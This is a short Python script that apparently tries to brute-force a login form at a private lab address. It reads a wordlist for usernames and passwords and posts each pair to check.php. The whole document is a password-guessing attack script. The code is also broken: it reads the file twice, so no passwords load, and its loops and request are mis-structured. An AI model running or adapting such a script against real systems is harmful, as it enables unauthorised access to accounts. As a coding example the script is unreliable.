import requests

with open("raft-small-words.txt", "r") as raft:
    usernames = raft.readlines()
    passwords = raft.readlines()

s = requests.Session()

for username in usernames:
    username = username.strip()

for password in passwords:
    password = password.strip()
        
    credentials = {
        'login_field': username,
        'cred_field': password
    }

response = s.post('http://172.25.0.32/check.php', data=credentials)

if "successful_login_message" in response.text:
     print(f"Successful login: Username = {username}, Password = {password}")




